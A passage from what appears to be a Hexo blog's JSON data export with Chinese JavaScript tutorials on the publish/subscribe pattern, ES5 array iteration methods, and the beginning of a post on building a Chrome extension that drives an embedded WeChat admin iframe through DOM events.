class=\"keyword\">function</span> <span class=\"title\">register</span>(<span class=\"params\"> type, fn </span>) </span>&#123;</span><br><span class=\"line\">  _MESSAGES[ type ] ? _MESSAGES[ type ].push( fn ) : _MESSAGES[ type ] = [ fn ];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 再提供提供一个用于发布事件的函数，组件可用，页面也可以用</span></span><br><span class=\"line\"><span class=\"comment\"> * @param type 发布事件的类型</span></span><br><span class=\"line\"><span class=\"comment\"> * @param backParama 发布事件时携带的参数</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">trigger</span>(<span class=\"params\"> type, ...backParama </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> _MESSAGES[ type ] &amp;&amp; _MESSAGES[ type ].forEach( <span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item.apply( <span class=\"keyword\">this</span>, backParama ) );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//  然后是组件本身的一些操作做完后</span></span><br><span class=\"line\"><span class=\"comment\">// some code</span></span><br><span class=\"line\"><span class=\"comment\">// 发布一个叫message的事件，并回传一个叫'hello world'的字符串</span></span><br><span class=\"line\">trigger( <span class=\"string\">'message'</span>, <span class=\"string\">'hello world!'</span> );</span><br></pre></td></tr></table></figure>\n<p>B.js 页面B，依赖组件A</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 引入</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; register &#125; <span class=\"keyword\">from</span> <span class=\"string\">'A'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 组件A发布叫message的事件</span></span><br><span class=\"line\">register( <span class=\"string\">'message'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 在回调里处理我们的事情</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>这样我们就完成了一个简单的订阅-发布模式，当然我们还可以一步步对其进行完善，比如我们要取消订阅，增加一个叫<code>remove</code>的函数用于取消对抽象组件的消息订阅。</p>\n<p>其实观察者模式在我们代码中无处不在，比如我们在多处对某个<code>dom</code>元素进行事件绑定，事件发生后会按照订阅顺序对订阅者进行分发。</p>\n"},{"title":"ECMAScript5中新增的数组遍历方法","catalog":true,"date":"2017-09-21T15:09:15.000Z","subtitle":null,"header-img":"post/IMG_2881.JPG","_content":"其实在接触`javascript`之前我甚至只知道用for循环去遍历数组，直到后来知道了`for...in`去遍历，但是直到后来知道for in带来的问题（如果扩展了`prototype`，该属性会被遍历出来，造成无法预估的错误），改用了`forEach`来循环遍历数组，再到后来了解到ES6的`for...of`也能遍历数组，但是ES6对于现代浏览器还是稍稍有点过早，今天我们要说的是早已被大多数浏览器实现的ES5标准里为数组对象添加的几个实用方法：\n\n1. forEach\n2. map\n3. filter\n4. some\n5. every\n6. reduce\n7. reduceRight\n\n### forEach\nforEach可能是大家最常见的遍历数组的方法了，接收一个函数作为参数，函数一共有三个参数，第一个是当前遍历出的数组元素，第二个是当前元素的下标，第三个就是数组本身了\n```js\n[ 1, 2 ,3, 4 ].forEach( console.log );\n// 1, 0, [1, 2, 3, 4]\n// 2, 1, [1, 2, 3, 4]\n// 3, 2, [1, 2, 3, 4]\n// 4, 3, [1, 2, 3, 4]\n```\n这里要注意的是，该方法执行后不会返回值，在回掉函数里返回任何值也不会被处理\n\n### map\nmap函数是我接触到也是使用第二广的方法，在接触`vuejs`这种数据驱动的`MVVM`框架之前，也有用，但是用得不多，之后因为全是和数据打交道，于是便有了很多使用场景。\n其实`map`见名知意就是一个印射，将当前数组印射成了一个新的数组比如，我们有一个用户数组，但是有个接口需要传入一个用户名字得数组，下面的数组并不是很符合我们的条件，我们就需要对下面数组进行编辑生成一个新的数组，于是map就派上用场了\n```js\nlet arr = [{\n  name: '张三',\n  age: 22\n}, {\n  name: '李四',\n  age: 34\n}, {\n  name: '王五',\n  age: 27\n}];\n\nlet newArr = arr.map( function( item ) {\n  return item.name;\n} );\n// [ '张三', '李四', '王五' ]\n```\n注意，map方法会将回调函数产生的值印射成一个新的值，如果你不返回值，map函数就会印射为`undefined`，如果30岁以上的我不想返回出去怎么办呢，那么`filter`函数就派上用场了\n\n### filter\n还是上面的arr变量如果要过滤掉30岁以上的数据\n```js\nlet newArr = arr.filter( function( item ) {\n  return item.age > 30;\n} ).map( function( item ) {\n  return item.name;\n} );\n// [ '李四' ]\n```\n这里就需要两个函数配合来完成我们的需求了，先过滤再来印射新的数组\n\n### some\nsome方法好像比较少用到，还是上面的数组，如果有个需求是判断上面的用户**有一个**大于30岁的，就去执行某个事情的时候就派上用场了，some方法返回的是一个boolean类型的数据\n```js\nlet isSomeGt30 = arr.some( function( itme ) {\n  return itme.age > 30;\n} );\n// true\n```\n\n### every\nevery方法和some方法正好相反，some方法是只要有一个返回值是true，那some返回的就是true，而every方法需要所有遍历的对象都返回true才是true，否则返回false，有点像`||`和`&&`的关系，\n\n\n```js\nlet isSomeGt30 = arr.every( function( itme ) {\n  return itme.age > 30;\n} );\n// false\n```\n### reduce, reduceRight\n这两个函数的callback函数接受4个参数：之前值、当前值、索引值以及数组本身。initialValue参数可选，表示初始值。若指定，则当作最初使用的previous值；如果缺省，则使用数组的第一个元素作为previous初始值，同时current往后排一位，相比有initialValue值少一次迭代。reduceRight和reduce迭代顺序相反，他是从数组右边开始的\n通常我们将其用于数组的求和\n```js\nvar sum = [1, 2, 3, 4].reduce(function ( previous, current, index, array ) {\n  return previous + current;\n});\n// 10\n```\n\n当然出于学习的目的的话，我们还应该理解这些方法的内部实现，比如作为较低版本浏览器的`polyfill`，能够更有效的帮助我们深入理解这几个函数。\n\n\n\n\n","source":"_posts/ES5-array-func.md","raw":"---\ntitle: ECMAScript5中新增的数组遍历方法\ncatalog: true\ndate: 2017-09-21 23:09:15\nsubtitle:\nheader-img: post/IMG_2881.JPG\ntags:\n- ES5\n---\n其实在接触`javascript`之前我甚至只知道用for循环去遍历数组，直到后来知道了`for...in`去遍历，但是直到后来知道for in带来的问题（如果扩展了`prototype`，该属性会被遍历出来，造成无法预估的错误），改用了`forEach`来循环遍历数组，再到后来了解到ES6的`for...of`也能遍历数组，但是ES6对于现代浏览器还是稍稍有点过早，今天我们要说的是早已被大多数浏览器实现的ES5标准里为数组对象添加的几个实用方法：\n\n1. forEach\n2. map\n3. filter\n4. some\n5. every\n6. reduce\n7. reduceRight\n\n### forEach\nforEach可能是大家最常见的遍历数组的方法了，接收一个函数作为参数，函数一共有三个参数，第一个是当前遍历出的数组元素，第二个是当前元素的下标，第三个就是数组本身了\n```js\n[ 1, 2 ,3, 4 ].forEach( console.log );\n// 1, 0, [1, 2, 3, 4]\n// 2, 1, [1, 2, 3, 4]\n// 3, 2, [1, 2, 3, 4]\n// 4, 3, [1, 2, 3, 4]\n```\n这里要注意的是，该方法执行后不会返回值，在回掉函数里返回任何值也不会被处理\n\n### map\nmap函数是我接触到也是使用第二广的方法，在接触`vuejs`这种数据驱动的`MVVM`框架之前，也有用，但是用得不多，之后因为全是和数据打交道，于是便有了很多使用场景。\n其实`map`见名知意就是一个印射，将当前数组印射成了一个新的数组比如，我们有一个用户数组，但是有个接口需要传入一个用户名字得数组，下面的数组并不是很符合我们的条件，我们就需要对下面数组进行编辑生成一个新的数组，于是map就派上用场了\n```js\nlet arr = [{\n  name: '张三',\n  age: 22\n}, {\n  name: '李四',\n  age: 34\n}, {\n  name: '王五',\n  age: 27\n}];\n\nlet newArr = arr.map( function( item ) {\n  return item.name;\n} );\n// [ '张三', '李四', '王五' ]\n```\n注意，map方法会将回调函数产生的值印射成一个新的值，如果你不返回值，map函数就会印射为`undefined`，如果30岁以上的我不想返回出去怎么办呢，那么`filter`函数就派上用场了\n\n### filter\n还是上面的arr变量如果要过滤掉30岁以上的数据\n```js\nlet newArr = arr.filter( function( item ) {\n  return item.age > 30;\n} ).map( function( item ) {\n  return item.name;\n} );\n// [ '李四' ]\n```\n这里就需要两个函数配合来完成我们的需求了，先过滤再来印射新的数组\n\n### some\nsome方法好像比较少用到，还是上面的数组，如果有个需求是判断上面的用户**有一个**大于30岁的，就去执行某个事情的时候就派上用场了，some方法返回的是一个boolean类型的数据\n```js\nlet isSomeGt30 = arr.some( function( itme ) {\n  return itme.age > 30;\n} );\n// true\n```\n\n### every\nevery方法和some方法正好相反，some方法是只要有一个返回值是true，那some返回的就是true，而every方法需要所有遍历的对象都返回true才是true，否则返回false，有点像`||`和`&&`的关系，\n\n\n```js\nlet isSomeGt30 = arr.every( function( itme ) {\n  return itme.age > 30;\n} );\n// false\n```\n### reduce, reduceRight\n这两个函数的callback函数接受4个参数：之前值、当前值、索引值以及数组本身。initialValue参数可选，表示初始值。若指定，则当作最初使用的previous值；如果缺省，则使用数组的第一个元素作为previous初始值，同时current往后排一位，相比有initialValue值少一次迭代。reduceRight和reduce迭代顺序相反，他是从数组右边开始的\n通常我们将其用于数组的求和\n```js\nvar sum = [1, 2, 3, 4].reduce(function ( previous, current, index, array ) {\n  return previous + current;\n});\n// 10\n```\n\n当然出于学习的目的的话，我们还应该理解这些方法的内部实现，比如作为较低版本浏览器的`polyfill`，能够更有效的帮助我们深入理解这几个函数。\n\n\n\n\n","slug":"ES5-array-func","published":1,"updated":"2017-09-22T01:35:27.897Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjv50002i4ucmqdoxzyo","content":"<p>其实在接触<code>javascript</code>之前我甚至只知道用for循环去遍历数组，直到后来知道了<code>for...in</code>去遍历，但是直到后来知道for in带来的问题（如果扩展了<code>prototype</code>，该属性会被遍历出来，造成无法预估的错误），改用了<code>forEach</code>来循环遍历数组，再到后来了解到ES6的<code>for...of</code>也能遍历数组，但是ES6对于现代浏览器还是稍稍有点过早，今天我们要说的是早已被大多数浏览器实现的ES5标准里为数组对象添加的几个实用方法：</p>\n<ol>\n<li>forEach</li>\n<li>map</li>\n<li>filter</li>\n<li>some</li>\n<li>every</li>\n<li>reduce</li>\n<li>reduceRight</li>\n</ol>\n<h3><span id=\"foreach\">forEach</span></h3>\n<p>forEach可能是大家最常见的遍历数组的方法了，接收一个函数作为参数，函数一共有三个参数，第一个是当前遍历出的数组元素，第二个是当前元素的下标，第三个就是数组本身了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[ <span class=\"number\">1</span>, <span class=\"number\">2</span> ,<span class=\"number\">3</span>, <span class=\"number\">4</span> ].forEach( <span class=\"built_in\">console</span>.log );</span><br><span class=\"line\"><span class=\"comment\">// 1, 0, [1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"comment\">// 2, 1, [1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"comment\">// 3, 2, [1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"comment\">// 4, 3, [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>\n<p>这里要注意的是，该方法执行后不会返回值，在回掉函数里返回任何值也不会被处理</p>\n<h3><span id=\"map\">map</span></h3>\n<p>map函数是我接触到也是使用第二广的方法，在接触<code>vuejs</code>这种数据驱动的<code>MVVM</code>框架之前，也有用，但是用得不多，之后因为全是和数据打交道，于是便有了很多使用场景。<br>\n其实<code>map</code>见名知意就是一个印射，将当前数组印射成了一个新的数组比如，我们有一个用户数组，但是有个接口需要传入一个用户名字得数组，下面的数组并不是很符合我们的条件，我们就需要对下面数组进行编辑生成一个新的数组，于是map就派上用场了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [&#123;</span><br><span class=\"line\">  name: <span class=\"string\">'张三'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">22</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'李四'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">34</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'王五'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">27</span></span><br><span class=\"line\">&#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> newArr = arr.map( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.name;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// [ '张三', '李四', '王五' ]</span></span><br></pre></td></tr></table></figure>\n<p>注意，map方法会将回调函数产生的值印射成一个新的值，如果你不返回值，map函数就会印射为<code>undefined</code>，如果30岁以上的我不想返回出去怎么办呢，那么<code>filter</code>函数就派上用场了</p>\n<h3><span id=\"filter\">filter</span></h3>\n<p>还是上面的arr变量如果要过滤掉30岁以上的数据</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> newArr = arr.filter( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.age &gt; <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125; ).map( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.name;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// [ '李四' ]</span></span><br></pre></td></tr></table></figure>\n<p>这里就需要两个函数配合来完成我们的需求了，先过滤再来印射新的数组</p>\n<h3><span id=\"some\">some</span></h3>\n<p>some方法好像比较少用到，还是上面的数组，如果有个需求是判断上面的用户<strong>有一个</strong>大于30岁的，就去执行某个事情的时候就派上用场了，some方法返回的是一个boolean类型的数据</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> isSomeGt30 = arr.some( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> itme </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> itme.age &gt; <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"every\">every</span></h3>\n<p>every方法和some方法正好相反，some方法是只要有一个返回值是true，那some返回的就是true，而every方法需要所有遍历的对象都返回true才是true，否则返回false，有点像<code>||</code>和<code>&amp;&amp;</code>的关系，</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> isSomeGt30 = arr.every( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> itme </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> itme.age &gt; <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"reduce-reduceright\">reduce, reduceRight</span></h3>\n<p>这两个函数的callback函数接受4个参数：之前值、当前值、索引值以及数组本身。initialValue参数可选，表示初始值。若指定，则当作最初使用的previous值；如果缺省，则使用数组的第一个元素作为previous初始值，同时current往后排一位，相比有initialValue值少一次迭代。reduceRight和reduce迭代顺序相反，他是从数组右边开始的<br>\n通常我们将其用于数组的求和</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> sum = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>].reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"> previous, current, index, array </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> previous + current;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 10</span></span><br></pre></td></tr></table></figure>\n<p>当然出于学习的目的的话，我们还应该理解这些方法的内部实现，比如作为较低版本浏览器的<code>polyfill</code>，能够更有效的帮助我们深入理解这几个函数。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>其实在接触<code>javascript</code>之前我甚至只知道用for循环去遍历数组，直到后来知道了<code>for...in</code>去遍历，但是直到后来知道for in带来的问题（如果扩展了<code>prototype</code>，该属性会被遍历出来，造成无法预估的错误），改用了<code>forEach</code>来循环遍历数组，再到后来了解到ES6的<code>for...of</code>也能遍历数组，但是ES6对于现代浏览器还是稍稍有点过早，今天我们要说的是早已被大多数浏览器实现的ES5标准里为数组对象添加的几个实用方法：</p>\n<ol>\n<li>forEach</li>\n<li>map</li>\n<li>filter</li>\n<li>some</li>\n<li>every</li>\n<li>reduce</li>\n<li>reduceRight</li>\n</ol>\n<h3>forEach</h3>\n<p>forEach可能是大家最常见的遍历数组的方法了，接收一个函数作为参数，函数一共有三个参数，第一个是当前遍历出的数组元素，第二个是当前元素的下标，第三个就是数组本身了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[ <span class=\"number\">1</span>, <span class=\"number\">2</span> ,<span class=\"number\">3</span>, <span class=\"number\">4</span> ].forEach( <span class=\"built_in\">console</span>.log );</span><br><span class=\"line\"><span class=\"comment\">// 1, 0, [1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"comment\">// 2, 1, [1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"comment\">// 3, 2, [1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"comment\">// 4, 3, [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>\n<p>这里要注意的是，该方法执行后不会返回值，在回掉函数里返回任何值也不会被处理</p>\n<h3>map</h3>\n<p>map函数是我接触到也是使用第二广的方法，在接触<code>vuejs</code>这种数据驱动的<code>MVVM</code>框架之前，也有用，但是用得不多，之后因为全是和数据打交道，于是便有了很多使用场景。<br>\n其实<code>map</code>见名知意就是一个印射，将当前数组印射成了一个新的数组比如，我们有一个用户数组，但是有个接口需要传入一个用户名字得数组，下面的数组并不是很符合我们的条件，我们就需要对下面数组进行编辑生成一个新的数组，于是map就派上用场了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [&#123;</span><br><span class=\"line\">  name: <span class=\"string\">'张三'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">22</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'李四'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">34</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'王五'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">27</span></span><br><span class=\"line\">&#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> newArr = arr.map( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.name;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// [ '张三', '李四', '王五' ]</span></span><br></pre></td></tr></table></figure>\n<p>注意，map方法会将回调函数产生的值印射成一个新的值，如果你不返回值，map函数就会印射为<code>undefined</code>，如果30岁以上的我不想返回出去怎么办呢，那么<code>filter</code>函数就派上用场了</p>\n<h3>filter</h3>\n<p>还是上面的arr变量如果要过滤掉30岁以上的数据</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> newArr = arr.filter( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.age &gt; <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125; ).map( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.name;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// [ '李四' ]</span></span><br></pre></td></tr></table></figure>\n<p>这里就需要两个函数配合来完成我们的需求了，先过滤再来印射新的数组</p>\n<h3>some</h3>\n<p>some方法好像比较少用到，还是上面的数组，如果有个需求是判断上面的用户<strong>有一个</strong>大于30岁的，就去执行某个事情的时候就派上用场了，some方法返回的是一个boolean类型的数据</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> isSomeGt30 = arr.some( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> itme </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> itme.age &gt; <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<h3>every</h3>\n<p>every方法和some方法正好相反，some方法是只要有一个返回值是true，那some返回的就是true，而every方法需要所有遍历的对象都返回true才是true，否则返回false，有点像<code>||</code>和<code>&amp;&amp;</code>的关系，</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> isSomeGt30 = arr.every( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> itme </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> itme.age &gt; <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<h3>reduce, reduceRight</h3>\n<p>这两个函数的callback函数接受4个参数：之前值、当前值、索引值以及数组本身。initialValue参数可选，表示初始值。若指定，则当作最初使用的previous值；如果缺省，则使用数组的第一个元素作为previous初始值，同时current往后排一位，相比有initialValue值少一次迭代。reduceRight和reduce迭代顺序相反，他是从数组右边开始的<br>\n通常我们将其用于数组的求和</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> sum = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>].reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"> previous, current, index, array </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> previous + current;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 10</span></span><br></pre></td></tr></table></figure>\n<p>当然出于学习的目的的话，我们还应该理解这些方法的内部实现，比如作为较低版本浏览器的<code>polyfill</code>，能够更有效的帮助我们深入理解这几个函数。</p>\n"},{"title":"记一次chrome扩展开发","catalog":true,"date":"2017-11-27T13:21:54.000Z","subtitle":null,"header-img":"post/IMG_3167.JPG","_content":"讲真，在这之前我甚至不知道chrome的插件是由`javascript`驱动的，最近因为为了优化产品的体验，开始从chrome插件来下手，因为chrome插件能强势侵入别家的网页，篡改任何你想篡改的东西，甚至可以将`http`的请求和响应数据进行修改。官方文档需要梯子， [360翻译的文档](http://open.chrome.360.cn/)（不是一般的老，看网页布局就知道了）, [百度翻译的文档](https://chajian.baidu.com/developer/extensions/getstarted.html).废话不多说，先来看看入口吧\nchrome插件最重要的是一个叫`manifest.json`的文件，文件描述了整个扩展的行为：\n* 整个扩展需要的权限（网络请求，标签页读取等）\n* 扩展的icon\n* 扩展的contentScript、background、popup资源路径\n* ...\n`contentScript`是注入到页面的js代码，但是它执行于一个隔离的环境，变量函数等与现有网页不会互相污染。\n`background`是一个背景\n> 背景页是一个运行在扩展进程中的HTML页面。它在你的扩展的整个生命周期都存在，同时，在同一时间只有一个实例处于活动状态。\n\n上面这句话是官方文档翻译后的描述，很符合“背景”这个名字，在后台，安安静静，相对一个整个浏览器的这个扩展，只有一个实例。\n`popup`这个页面就是我们在点击扩展按钮时弹出的一个html页面，它可以与其他两个进行通信。\n\n其实我们要做的是，将微信等平台通过`iframe`的形式嵌入到我们页面，且不让用户看到，通过代码来操作iframe内的内容，使用户在使用我们产品的同时，能够保留保留微信后台的体验。\n\n经过我的整理，整个扩展与我们页面的交互流程大致应该是这样的\n1. 当页面发起一个请求，判断插件是否安装成功\n2. 若安装有扩展则再通知扩展需要的操作\n3. 扩展插入iframe后注入contentScript\n4. contentScript执行再通知扩展，扩展再通知我们的页面获取结果\n\n当然这只是一个大致流程，扩展的`contentScript`与页面唯一的通信方法则是触发某个dom的原生事件或自定义事件，再传入所需的数据。**发布/订阅模式**看来真的是万能啊。\n\n当然，为了其他人开发的方便性和可维护性，我建立了一个单独的模块`chromeExtentionHandler`，由这个模块统一管理与扩展的交互（这也是发布/订阅模式的弊端，过多的订阅发布，容易造成困扰，降低代码可读性）\n\n监听来自扩展的事件，只需要一处就够了，扩展通过带过来的数据来告知模块需要发布或处理怎样的数据，所以定义的页面端的模块传入数据是这样的\n```json\n{\n  \"event\": \"\",\n  \"platform\": \"\",\n  \"data\": {}\n}\n```\n所以我在事件监听处是这么写的\n```js\ndocument.body.addEventListener( 'extensionBrowerEvent', function( { detail } ) {\n  let jsonDetail = null;\n  try {\n    jsonDetail = typeof detail === 'object' ? ( detail || {} ) : JSON.parse( detail );\n  } catch ( error ) {\n    return;\n  }\n  let { event, data, platform } = jsonDetail;\n\n  let eventHandlers = platformHandler[ platform ];\n  let namespaceEvent = `${platform}.${event}`;\n\n  if ( eventHandlers ) {\n    // 根据平台来获取相关的事件处理\n    let handlerItem = eventHandlers[ namespaceEvent ];\n    handlerItem ? handlerItem( data ) : events.emit( namespaceEvent, data );\n  } else {\n    events.emit( namespaceEvent, data );\n  }\n}, false );\n```\n`event`就是用来描述此次扩展消息的名称的，因为可能会存在多个平台操作的问题，所以`platform`用来标记平台名称，比如`wechat`，data当然是此次消息需要的数据。`namespaceEvent`是用来描述命名空间了，为了对不同平台相同的事件进行区分。\n这些事件中，有些需要模块来处理，有些需要模块调用者来处理，所以在上面的`if`逻辑里，就是用扩展通知的数据去匹配定义在对象里的函数进行处理，处理后再由函数决定是否发布此事件，若没有匹配到，则直接在此发布事件，说明此事件应由模块调用者自己处理。举个例子，扩展发出的数据是这样的\n```json\n{\n  \"event\": \"scanCode\",\n  \"platform\": \"wechat\",\n  \"data\": null\n}\n```\n于是我们在平台为`wechat`的模块里定义了它的处理函数\n```js\n{\n  'wechat.scanCode'( data ) {\n    // do something\n\n    events.emit( 'wechat.scanCode', data );\n  